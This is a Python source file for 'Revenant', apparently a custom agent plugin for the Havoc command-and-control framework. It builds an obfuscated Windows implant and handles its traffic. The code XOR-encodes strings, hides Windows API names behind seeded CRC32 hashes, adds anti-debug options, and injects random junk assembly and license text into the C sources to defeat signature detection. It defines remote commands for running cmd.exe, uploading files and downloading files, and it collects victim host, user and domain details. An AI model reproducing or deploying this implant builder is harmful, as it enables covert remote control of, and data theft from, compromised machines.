import binascii
import subprocess
import glob
import os
import re
import random
import sys

from base64 import b64decode
from havoc.service import HavocService
from havoc.agent import *

'''
#define COMMAND_REGISTER         0x100
#define COMMAND_GET_JOB          0x101
#define COMMAND_NO_JOB           0x102
#define COMMAND_SHELL            0x152
#define COMMAND_UPLOAD           0x153
#define COMMAND_DOWNLOAD         0x154
#define COMMAND_EXIT             0x155
#define COMMAND_OUTPUT           0x200
'''

RANDOM_COMMANDS = True

COMMAND_REGISTER = 0x100
COMMAND_GET_JOB = 0x101
COMMAND_NO_JOB = 0x102
COMMAND_SHELL = 0x152
COMMAND_UPLOAD = 0x153
COMMAND_DOWNLOAD = 0x154
COMMAND_EXIT = 0x155
COMMAND_OUTPUT = 0x200


def generate_command_constants():

    COMMAND_REGISTER = random.randint(0, 0xFFFF)
    COMMAND_GET_JOB = random.randint(0, 0xFFFF)
    COMMAND_NO_JOB = random.randint(0, 0xFFFF)
    COMMAND_SHELL = random.randint(0, 0xFFFF)
    COMMAND_UPLOAD = random.randint(0, 0xFFFF)
    COMMAND_DOWNLOAD = random.randint(0, 0xFFFF)
    COMMAND_EXIT = random.randint(0, 0xFFFF)
    COMMAND_OUTPUT = random.randint(0, 0xFFFF)

    return (COMMAND_REGISTER, COMMAND_GET_JOB, COMMAND_NO_JOB, COMMAND_SHELL, COMMAND_UPLOAD, COMMAND_DOWNLOAD, COMMAND_EXIT, COMMAND_OUTPUT)


GENERATED_PASSWORD: str = ''.join(random.choices(string.ascii_letters, k=16))
password_bytes = GENERATED_PASSWORD.encode('utf-8')
password_hex = ", ".join(f"0x{b:02x}" for b in password_bytes)

seed_str: str = ''.join(random.choices(string.ascii_letters, k=8))
GENERATED_SEED = int(binascii.crc32(seed_str.encode())) # 0xDEADDEAD

directory_path = "./Agent/Source/"

#x86
instructions_x86 = [
    "nop;",
    "mov eax, eax;",
    "mov ecx, ecx;",
    "mov edx, edx;",
    "inc eax;",
    "dec eax;",
    "xor eax, eax;",
    "xor ecx, ecx;",
    "cmp eax, eax;",
    "test eax, eax;",
    ''"xor eax,eax;" \
    "xor ecx,ecx;" \
    "xor eax,eax;" \
    "xor ecx,ecx;" \
    "xor eax,eax;" \
    "xor ecx,ecx;" \
    "xor eax,eax;"''
]



#x64
# Volatile registers: rax, rcx, rdx, r8, r9
instructions_x64 = [
    "nop",
    "mov eax, ebx",
    "mov eax, ecx",
    "mov eax, edx",
    "mov eax, r8d",
    "mov eax, r9d",
    "inc rax",
    "dec rax",
    "xor rax, rax",
    "mov rax, rbx",
    "mov rax, rcx",
    "mov rax, rdx",
    "mov rax, r8",
    "mov rax, r9",
    "xor rax, rax",
    "cmp rax, rax",
    "test rax, rax",
    ''"pushfq;" \
    "push rcx;" \
    "push rdx;" \
    "push r8;" \
    "push r9;" \
    "xor eax, eax;" \
    "xor eax, eax;" \
    "xor ebx, ebx;" \
    "xor eax, eax;" \
    "xor eax, eax;" \
    "pop r9;" \
    "pop r8;" \
    "pop rdx;" \
    "pop rcx;" \
    "popfq;"''
]

eula = ["MICROSOFT SOFTWARE LICENSE TERMS", \
        "(MVLTECHNOLOGIES1.0 – STABLE CHANNEL)", \
        "MICROSOFT VISUAL STUDIO COMMUNITY 2019", \
        "These license terms are an agreement between", \
        "Microsoft Corporation (or based on where you live,", \
        "one of its affiliates) and you. Please read them.", \
        "They apply to the software named above, which", \
        "includes the media on which you received it, if", \
        "any. The terms also apply to any Microsoft", \
        "updates,", "supplements,", "Internet-based services,", \
        "and support services", "for", "this software, unless", \
        "other terms accompany those items. If so, those", \
        "terms apply.", "BY USING THE SOFTWARE, YOU ACCEPT", \
        "THESE TERMS. IF YOU DO NOT ACCEPT THEM, DO NOT", \
        "USE THE SOFTWARE. INSTEAD, RETURN IT TO THE", \
        "RESELLER FOR A REFUND OR CREDIT.", "As described", \
        "below,", "using the software also operates as your", \
        "consent", "to the transmission of certain", \
        "computer", "information", "for Internet-based", \
        "services,", "as", "described", "in the privacy", \
        "statement", "described in Section 3. If you", \
        "comply with these license terms, you have the", \
        "rights below.", "1. INSTALLATION AND USE RIGHTS.", \
        "a. Individual license. If you are an individual", \
        "working on your own applications to sell or for", \
        "any other purpose,", "you may use the software to", \
        "develop", "and test", "those applications."]


plain_function_strings = [
    "#define DeviceIoControl_CRC32B                 \"DeviceIoControl\"",
    "#define CreateFileW_CRC32B                     \"CreateFileW\"",
    "#define GetSystemInfo_CRC32B                   \"GetSystemInfo\"",
    "#define GlobalMemoryStatusEx_CRC32B            \"GlobalMemoryStatusEx\"",
    "#define RtlRandomEx_CRC32B                     \"RtlRandomEx\"",
    "#define RtlGetVersion_CRC32B                   \"RtlGetVersion\"",
    "#define RtlInitUnicodeString_CRC32B            \"RtlInitUnicodeString\"",
    "#define RtlAllocateHeap_CRC32B                 \"RtlAllocateHeap\"",
    "#define RtlGetProcessHeaps_CRC32B              \"RtlGetProcessHeaps\"",
    "#define RtlFreeHeap_CRC32B                     \"RtlFreeHeap\"",
    "#define RtlCreateProcessParametersEx_CBC32B    \"RtlCreateProcessParametersEx\"",
    "#define RtlDestroyProcessParameters_CRC32B     \"RtlDestroyProcessParameters\"",
    "#define NtCreateFile_CRC32b                    \"NtCreateFile\"",
    "#define NtOpenFile_CRC32b                      \"NtOpenFile\"",
    "#define NtProtectVirtualMemory_CRC32b          \"NtProtectVirtualMemory\"",
    "#define NtQueryInformationFile_CRC32B          \"NtQueryInformationFile\"",
    "#define NtAllocateVirtualMemory_CRC32B         \"NtAllocateVirtualMemory\"",
    "#define NtCreateUserProcess_CRC32B             \"NtCreateUserProcess\"",
    "#define NtWriteFile_CRC32B                     \"NtWriteFile\"",
    "#define NtReadFile_CRC32B                      \"NtReadFile\"",
    "#define WinHttpOpen_CRC32B                     \"WinHttpOpen\"",
    "#define WinHttpCloseHandle_CRC32B              \"WinHttpCloseHandle\"",
    "#define WinHttpSetOption_CRC32B                \"WinHttpSetOption\"",
    "#define WinHttpConnect_CRC32B                  \"WinHttpConnect\"",
    "#define WinHttpOpenRequest_CRC32B              \"WinHttpOpenRequest\"",
    "#define WinHttpReadData_CRC32B                 \"WinHttpReadData\"",
    "#define WinHttpReceiveResponse_CRC32B          \"WinHttpReceiveResponse\"",
    "#define WinHttpSendRequest_CRC32B              \"WinHttpSendRequest\"",
    "#define IsDebuggerPresent_CRC32B               \"IsDebuggerPresent\"",
    "#define CheckRemoteDebuggerPresent_CRC32B      \"CheckRemoteDebuggerPresent\""

]

plain_strings = [
    "#define S_INSTANCE_NOT_CONNECTED \"instance not connected!\"",
    "#define S_COMMAND_NOT_FOUND      \"command not found\"",
    "#define S_IS_COMMAND_NO_JOB      \"is command no job\"",
    "#define S_TRANSPORT_FAILED       \"transport failed\"",
    "#define S_COMMAND_SHELL          \"command shell\"",
    "#define S_COMMAND_UPLOAD         \"command upload\"",
    "#define S_COMMAND_DOWNLOAD       \"command download\"",
    "#define S_COMMAND_EXIT           \"command exit\"",
    "#define S_WINHTTP                \"winhttp\"",
    "#define S_KERNEL32               \"kernel32.dll\"",
    "#define S_MARKER_MASK            \"xxxxxxxxxxxxxxxxxxxxxxxx\""

]


def crc32b(s: str):
    crc = 0xFFFFFFFF
    i = 0
    while i != len(s):
        byte = s[i]
        crc = crc ^ byte
        for j in range(7, -1, -1):
            mask = -1 * (crc & 1)
            crc = (crc >> 1) ^ (GENERATED_SEED & mask)
        i += 1
    return ~crc & 0xFFFFFFFF


def xor_encode(s: str) -> str:
    s_with_null_byte = s + "\x00"
    password_bytes: bytes = GENERATED_PASSWORD.encode()
    password_cycle: bytes = (password_bytes * (len(s_with_null_byte) // len(password_bytes) + 1))[:len(s_with_null_byte)]
    xor_bytes: bytes = bytes(b1 ^ b2 for b1, b2 in zip(s_with_null_byte.encode(), password_cycle))
    return ", ".join(f"0x{b:02x}" for b in xor_bytes)


def generate_crc32b_defs(plain_function_strings):
    crc32b_defs = []
    output_string = f"#define SEED {GENERATED_SEED}"
    crc32b_defs.append(output_string)
    for string in plain_function_strings:
        # Extract function name from string definition
        function_name = string.split()[2].strip('"')

        # Calculate CRC32B hash of function name
        crc32b_hash = hex(crc32b(function_name.encode()))

        # Format output string with hash and original definition
        output_string = f"#define {function_name}_CRC32B {crc32b_hash}"

        # Add output string to list
        crc32b_defs.append(output_string)

    # Join all output strings into a single string with newline separators
    return "\n".join(crc32b_defs)

def encode_strings(strings):
    encoded_strings = []
    output = f"#define S_XK {{{password_hex}}}"
    encoded_strings.append(output)
    for s in strings:
        # Extract the string contents
        contents = s.split('"')[1]
        # Apply XOR encoding
        encoded = xor_encode(contents)
        # Format the output string
        output = f"#define {s.split()[1]} {{{encoded}}}"
        encoded_strings.append(output)
    return "\n".join(encoded_strings)


def write_command_header_file():

    header_file_contents = f"""#ifndef REVENANT_COMMAND_H
#define REVENANT_COMMAND_H

#include <windows.h>
#include "Parser.h"

#define COMMAND_REGISTER         {COMMAND_REGISTER}
#define COMMAND_GET_JOB          {COMMAND_GET_JOB}
#define COMMAND_NO_JOB           {COMMAND_NO_JOB}
#define COMMAND_SHELL            {COMMAND_SHELL}
#define COMMAND_UPLOAD           {COMMAND_UPLOAD}
#define COMMAND_DOWNLOAD         {COMMAND_DOWNLOAD}
#define COMMAND_EXIT             {COMMAND_EXIT}
#define COMMAND_OUTPUT           {COMMAND_OUTPUT}

typedef struct {{
    INT ID;
    VOID (*Function)(PPARSER Arguments);
}} RVNT_COMMAND;

VOID CommandDispatcher();
VOID CommandShell(PPARSER Parser);
VOID CommandUpload(PPARSER Parser);
VOID CommandDownload(PPARSER Parser);
VOID CommandExit(PPARSER Parser);

#endif //REVENANT_COMMAND_H
"""
    for filepath in glob.iglob('**/Command.h', recursive=True):
        with open(filepath, 'w') as file:
            file.write(header_file_contents)


def replace_in_file(filename, old_string, new_string):
    with open(filename, "r+") as f:
        file_contents = f.read()
        updated_file_contents = file_contents.replace(old_string, new_string)
        f.seek(0)
        f.truncate()
        f.write(updated_file_contents)


def process_strings_h():
    strings_file = generate_crc32b_defs(plain_function_strings)+"\n"+encode_strings(plain_strings)
    for filepath in glob.iglob('**/Strings.h', recursive=True):
        with open(filepath, 'w') as f:
            f.write(strings_file)

def process_config_h(config: dict):
    config_user_agent:         str = xor_encode(config['Options']['Listener']['UserAgent'])
    config_host_bind:          str = xor_encode(config['Options']['Listener']['HostBind'])
    config_host_port:          str = config['Options']['Listener']['PortBind']
    config_host_secure:        str = str(config['Options']['Listener']['Secure']).upper()
    config_sleep:              str = config['Config']['Sleep']
    config_poly:               str = str(config['Config']['Polymorphic'])
    config_obf_strings:        str = str(config['Config']['Obfuscation'])
    config_arch:               str = config['Options']['Arch']
    config_native:             str = str(config['Config']['Native']).upper()
    config_anti_debug:         str = str(config['Config']['AntiDebug']).upper()

    header_file = f'''
#define CONFIG_USER_AGENT {{{config_user_agent}}}
#define CONFIG_HOST {{{config_host_bind}}}
#define CONFIG_PORT {config_host_port}
#define CONFIG_SECURE {str(config_host_secure).upper()}
#define CONFIG_SLEEP {config_sleep} 
#define CONFIG_POLYMORPHIC {str(config_poly).upper()}  
#define CONFIG_OBFUSCATION {str(config_obf_strings).upper()}
#define CONFIG_ARCH {config_arch}  
#define CONFIG_NATIVE {str(config_native).upper()}
#define CONFIG_ANTI_DEBUG {str(config_anti_debug).upper()}
    '''

    for filepath in glob.iglob('**/Config.h', recursive=True):
        with open(filepath, 'w') as f:
            f.write(header_file)


class CommandShell(Command):
    def __init__(self):
        self.CommandId: int = COMMAND_SHELL
        self.Name: str = "shell"
        self.Description: str = "executes command using cmd.exe"
        self.Help: str = ""
        self.NeedAdmin: bool = False
        self.Mitr: list = []
        self.Params: list = [
            CommandParam(
                name="commands",
                is_file_path=False,
                is_optional=False
            )
        ]

    def job_generate(self, arguments: dict) -> bytes:
        task: Packer = Packer()
        task.add_int(self.CommandId)
        task.add_data("c:\\windows\\system32\\cmd.exe /c " + arguments['commands'])
        return task.buffer


class CommandUpload(Command):
    def __init__(self):
        self.CommandId: int = COMMAND_UPLOAD
        self.Name: str = "upload"
        self.Description: str = "uploads a file to the host"
        self.Help: str = ""
        self.NeedAdmin: bool = False
        self.Mitr: list = []
        self.Params: list = [
            CommandParam(
                name="local_file",
                is_file_path=True,
                is_optional=False
            ),
            CommandParam(
                name="remote_file",
                is_file_path=False,
                is_optional=False
            )
        ]

    def job_generate(self, arguments: dict) -> bytes:
        task: Packer = Packer()
        remote_file: str = arguments['remote_file']
        filedata = b64decode(arguments['local_file']).decode()
        task.add_int(self.CommandId)
        task.add_data(remote_file)
        task.add_data(filedata)
        return task.buffer


class CommandDownload(Command):
    def __init__(self):
        self.CommandId: int = COMMAND_DOWNLOAD
        self.Name: str = "download"
        self.Description: str = "downloads the requested file"
        self.Help: str = ""
        self.NeedAdmin: bool = False
        self.Mitr: list = []
        self.Params: list = [
            CommandParam(
                name="remote_file",
                is_file_path=False,
                is_optional=False
            ),
        ]

    def job_generate(self, arguments: dict) -> bytes:
        task: Packer = Packer()
        remote_file: str = arguments['remote_file']
        task.add_int(self.CommandId)
        task.add_data(remote_file)
        return task.buffer


class CommandExit(Command):
    def __init__(self):
        self.CommandId: int = COMMAND_EXIT
        self.Name: str = "exit"
        self.Description: str = "tells agent to exit"
        self.Help: str = ""
        self.NeedAdmin: bool = False
        self.Mitr: list = []
        self.Params: list = []

    def job_generate(self, arguments: dict) -> bytes:
        task: Packer = Packer()
        task.add_int(self.CommandId)
        return task.buffer


class Revenant(AgentType):
    def __init__(self):
        self.Name: str = "Revenant"
        self.Author: str = "0xTriboulet for Malicious Group"
        self.Version: str = "0.49"
        self.Description: str = "Revenant"
        self.MagicValue = 0x72766e74

        self.Arch: list = ["64", "86"]
        self.Formats: list = [
            {"Name": "Windows Exe", "Extension": "exe"},
            #{"Name": "Windows DLL", "Extension": "dll"}   # Not supported yet
        ]
        self.BuildingConfig: dict = {
            "Sleep": "10",
            "Polymorphic": True,
            "Obfuscation": True,
            "Native"    : True,
            "AntiDebug" : True,
            "RandCmdIds": True
        }
        self.Commands: list = [
            CommandShell(),
            CommandUpload(),
            CommandDownload(),
            CommandExit()
        ]

    def generate(self, config: dict) -> None:
        print(f"[*] Building Revenant Agent {self.Version}")
        # print(f"config: {config}")

        self.builder_send_message(config['ClientID'], "Info", f"Hello - From Service Builder")
        self.builder_send_message(config['ClientID'], "Info", f"Options Config: {config['Options']}")
        self.builder_send_message(config['ClientID'], "Info", f"Agent Config: {config['Config']}")

        # parse options from self
        print(f"[*] Revenant Magic Value {self.MagicValue}")

        print("[*] Configuring Config.h header...")
        process_config_h(config)

        if config['Config']['RandCmdIds']:
            write_command_header_file()
            print("[*] Configuring Command.h header...")

        if config['Config']['Obfuscation']:
            process_strings_h()
            print("[*] Configuring String.h header...")

        if config['Options']['Arch'] == "64":

            if config['Config']['Polymorphic']:
                process_directory(directory_path, instructions_x64, eula, False)
                print("[*] Configuring source files x64...")

            compile_command: str = "cmake -DARCH=x64 . && cmake --build . -j 1"

            try:
                process = subprocess.run(compile_command,
                                         shell=True,
                                         check=True,
                                         stdout=subprocess.PIPE,
                                         stderr=subprocess.PIPE,
                                         universal_newlines=True)

                if config['Config']['Polymorphic']:
                    process_directory(directory_path, instructions_x64, eula, True)
                    print("[*] Cleaning up source files...")

                print(process.stdout)
            except subprocess.CalledProcessError as error:
                print(f"Error occurred: {error.stderr}")

                if config['Config']['Polymorphic']: # Retain poly for debugging
                    #process_directory(directory_path, instructions_x64, True)
                    print("[*] !! NOT Cleaning up source files !!")

                return
            data = open("Agent/Bin/x64/Revenant.exe", "rb").read()

        elif config['Options']['Arch'] == "86":
            compile_command: str = "cmake -DARCH=x86 . && cmake --build . -j 1"

            if config['Config']['Polymorphic']:
                process_directory(directory_path, instructions_x86, eula, False)
                print("[*] Configuring source files x86...")

            try:
                process = subprocess.run(compile_command,
                                         shell=True,
                                         check=True,
                                         stdout=subprocess.PIPE,
                                         stderr=subprocess.PIPE,
                                         universal_newlines=True)

                if config['Config']['Polymorphic']:
                    process_directory(directory_path, instructions_x86, eula, True)
                    print("[*] Cleaning up source files...")

                print(process.stdout)
            except subprocess.CalledProcessError as error:
                print(f"Error occurred: {error.stderr}")

                if config['Config']['Polymorphic']:
                    process_directory(directory_path, instructions_x64, eula, True)
                    print("[*] Cleaning up source files...")

                return

            data = open("Agent/Bin/x86/Revenant.exe", "rb").read()

        # Below line sends the build executable back to Havoc for file management - 0xtriboulet
        self.builder_send_payload(config['ClientID'], self.Name + "." + self.Formats[0]["Extension"], data)

    def response(self, response: dict) -> bytes:

        agent_header: dict = response["AgentHeader"]
        agent_response = b64decode(response["Response"])
        response_parser = Parser(agent_response, len(agent_response))
        command: int = response_parser.parse_int()

        if response["Agent"] is None:
            if command == COMMAND_REGISTER:
                print("[*] Is agent register request")

                registerinfo = {
                    "AgentID": response_parser.parse_int(),
                    "Hostname": response_parser.parse_str(),
                    "Username": response_parser.parse_str(),
                    "Domain": response_parser.parse_str(),
                    "InternalIP": response_parser.parse_str(),
                    "Process Path": response_parser.parse_str(),
                    "Process ID": str(response_parser.parse_int()),
                    "Process Parent ID": str(response_parser.parse_int()),
                    "Process Arch": response_parser.parse_int(),
                    "Process Elevated": response_parser.parse_int(),
                    "OS Build": "{0}.{1}.{2}.{3}.{4}".format(str(response_parser.parse_int()),
                                                             str(response_parser.parse_int()),
                                                             str(response_parser.parse_int()),
                                                             str(response_parser.parse_int()),
                                                             str(response_parser.parse_int())),
                    "OS Arch": response_parser.parse_int(),
                    "Sleep": response_parser.parse_int(),
                }

                registerinfo["Process Name"] = registerinfo["Process Path"].split("\\")[-1]
                registerinfo["OS Version"] = registerinfo["OS Build"]

                os_arch_map = {
                    0: "x86",
                    9: "x64/AMD64",
                    5: "ARM",
                    12: "ARM64",
                    6: "Itanium-based"
                }

                registerinfo["OS Arch"] = os_arch_map.get(
                    registerinfo["OS Arch"],
                    "Unknown (" + str(registerinfo["OS Arch"]) + ")")

                proc_arch_map = {
                    0: "Unknown",
                    1: "x86",
                    2: "x64",
                    3: "IA64"
                }

                registerinfo["Process Arch"] = proc_arch_map.get(
                    registerinfo["Process Arch"],
                    "Unknown (" + str(registerinfo["Process Arch"]) + ")")

                self.register(agent_header, registerinfo)
                return registerinfo['AgentID'].to_bytes(4, 'little')  # return the agent id to the agent
            else:
                print("[-] Is not agent register request")
        else:
            print(f"[*] Something else: {command}")
            agentid = response["Agent"]["NameID"]
            if command == COMMAND_GET_JOB:
                print("[*] Get list of jobs and return it.")
                tasks = self.get_task_queue(response["Agent"])

                if len(tasks) == 0:
                    tasks = COMMAND_NO_JOB.to_bytes(4, 'little')

                print(f"tasks: {tasks.hex()}")
                return tasks

            elif command == COMMAND_OUTPUT:
                output = response_parser.parse_str()
                print("[*] Output: \n" + output)
                self.console_message(agentid, "Good", "Received Output:", output)
            elif command == COMMAND_UPLOAD:
                filesize = response_parser.parse_int()
                filename = response_parser.parse_str()
                self.console_message(agentid, "Good", f"File was uploaded: {filename} ({filesize} bytes)", "")
            elif command == COMMAND_DOWNLOAD:
                filename = response_parser.parse_str()
                filecontent = response_parser.parse_str()
                self.console_message(agentid, "Good", f"File was downloaded: {filename} ({len(filecontent)} bytes)", "")
                self.download_file(agentid, filename, len(filecontent), filecontent)
            else:
                self.console_message(agentid, "Error", "command not found: %4x" % command, "")

        return b''


def insert_asm_before_vars(file_contents, instructions):
    return_pattern = re.compile(r"^\s*(?P<type>\w+)\s+(?P<var_name>\w+)\s*=\s*(?P<value>[^;]+)\s*;", re.MULTILINE)

    def insert_asm(match):
        num_statements = random.randint(0, 1)
        asm_statements = "\n".join(
            "//remove me\nasm(\"{}\");".format(random.choice(instructions)) for _ in range(num_statements)
        )
        return asm_statements + "\n" + match.group(0)

    modified_contents = return_pattern.sub(insert_asm, file_contents)

    return modified_contents


def insert_asm_statements(file_contents, instructions):
    modified_contents = insert_asm_before_vars(file_contents, instructions)

    function_pattern = re.compile(
        r"(?P<return_type>[\w\s\*]+)\s+(?P<func_name>\w+)\s*\((?P<params>[^\)]*)\)\s*\{",
        re.MULTILINE
    )

    def insert_asm(match):
        num_statements = random.randint(1, 100)
        asm_statements = "\n".join(
            "//remove me\nasm(\"{}\");".format(random.choice(instructions)) for _ in range(num_statements)
        )
        return match.group(0) + "\n" + asm_statements

    modified_contents = function_pattern.sub(insert_asm, modified_contents)

    return modified_contents


def remove_asm_statements(file_contents):
    # Regex pattern to match and remove lines after "//remove me" comments
    remove_pattern = re.compile(r"//remove me\n.*;\n?", re.MULTILINE)
    modified_contents = remove_pattern.sub("", file_contents)
    return modified_contents



def insert_string_declarations(file_contents, eula):
    function_pattern = re.compile(
        r"(?P<return_type>[\w\s\*]+)\s+(?P<func_name>\w+)\s*\((?P<params>[^\)]*)\)\s*\{",
        re.MULTILINE
    )

    def insert_string(match):
        num_statements = random.randint(1, 50)
        string_statements = "\n".join(
            "//remove me\nchar *str{} = \"{}\";".format(random.randint(10000, 99999), random.choice(eula)) for _ in range(num_statements)
        )
        return match.group(0) + "\n" + string_statements

    modified_contents = function_pattern.sub(insert_string, file_contents)

    return modified_contents

def remove_string_declarations(file_contents):
    # Regex pattern to match and remove lines after "//remove me" comments
    remove_pattern = re.compile(r"//remove me\nchar \*str\d+ = \".*?\";\n?", re.MULTILINE)
    modified_contents = remove_pattern.sub("", file_contents)
    return modified_contents


def process_c_file(file_path, instructions, eula, remove=False):
    with open(file_path, 'r') as input_file:
        file_contents = input_file.read()

    if remove:
        modified_contents = remove_asm_statements(file_contents)
        modified_contents = remove_string_declarations(modified_contents)
    else:
        modified_contents = insert_asm_statements(file_contents, instructions)
        modified_contents = insert_string_declarations(modified_contents, eula)

    with open(file_path, 'w') as output_file:
        output_file.write(modified_contents)


def process_directory(directory_path, instructions, eula, remove=False):
    for filename in os.listdir(directory_path):
        if filename.endswith('.c'):
            file_path = os.path.join(directory_path, filename)
            process_c_file(file_path, instructions, eula, remove)

def main():
    havoc_revenant: Revenant = Revenant()

    print("[*] Connect to Havoc service api")
    havoc_service = HavocService(
        endpoint="wss://127.0.0.1:40056/service-endpoint",
        password="service-password"
    )

    print("[*] Register Revenant to Havoc")
    havoc_service.register_agent(havoc_revenant)

    return


if __name__ == '__main__':
    main()